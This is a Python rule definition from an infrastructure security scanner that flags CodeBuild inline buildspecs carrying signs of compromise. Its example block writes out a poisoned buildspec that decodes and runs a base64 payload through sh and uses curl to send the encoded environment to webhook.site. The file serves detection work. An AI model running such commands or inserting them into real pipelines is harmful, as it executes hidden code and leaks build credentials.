"""CB-011 (CloudFormation). CodeBuild inline buildspec has IOCs."""
from __future__ import annotations

from ...base import Finding, Severity
from ...rule import Rule
from ..base import CloudFormationContext
from ..extended import _codebuild

RULE = Rule(
    id="CB-011",
    title="CodeBuild buildspec contains indicators of malicious activity",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4",),
    cwe=("CWE-506",),
    recommendation=(
        "Treat any hit on this rule as a potential pipeline "
        "compromise. Identify the commit that introduced the "
        "buildspec, rotate every credential reachable by the "
        "project's service role, and move the buildspec to a "
        "repo-sourced file under branch protection (see CB-008)."
    ),
    docs_note=(
        "Runs the shared buildspec-IOC matcher against any inline "
        "``Source.BuildSpec``. The matcher looks for reverse-shell "
        "payloads, miner CLIs, secret-exfil patterns, and "
        "credential-grabbing one-liners."
    ),
    exploit_example=(
        "# Vulnerable: the project's BuildSpec carries indicators\n"
        "# of malicious activity (base64-decode exec, exfil POSTs,\n"
        "# miner binaries). Either the BuildSpec was poisoned\n"
        "# via UpdateStack or pulled from a compromised repo.\n"
        "Resources:\n"
        "  Build:\n"
        "    Type: AWS::CodeBuild::Project\n"
        "    Properties:\n"
        "      Source:\n"
        "        BuildSpec: |\n"
        "          phases:\n"
        "            build:\n"
        "              commands:\n"
        "                - echo Z2g6Li4uIA== | base64 -d | sh\n"
        "                - curl https://webhook.site/abc?env=$(env|base64)\n"
        "\n"
        "# Safe: the BuildSpec does only what the build needs.\n"
        "# If a check fires here, rotate the project's role,\n"
        "# audit recent builds, identify the introducing change.\n"
        "Resources:\n"
        "  Build:\n"
        "    Type: AWS::CodeBuild::Project\n"
        "    Properties:\n"
        "      Source:\n"
        "        BuildSpec: |\n"
        "          phases:\n"
        "            build:\n"
        "              commands: [make build]"
    ),
)


def check(ctx: CloudFormationContext) -> list[Finding]:
    return [f for f in _codebuild(ctx) if f.check_id == "CB-011"]
